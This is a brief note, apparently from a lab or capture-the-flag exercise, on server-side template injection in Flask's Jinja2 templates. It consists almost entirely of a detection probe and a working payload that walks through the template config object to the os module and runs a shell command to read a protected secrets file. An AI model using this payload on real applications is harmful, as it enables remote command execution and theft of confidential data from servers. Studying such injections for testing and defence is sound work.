### Server Side Template Injection

---

Example of a vulnerability : 

```py
{{5*5}}
```

Flask payload for Jinja2 : 

```py
{{config.__class__.__init__.__globals__['os'].popen('cat flaskr/protected/burdellsecrets.txt').read()}}
```

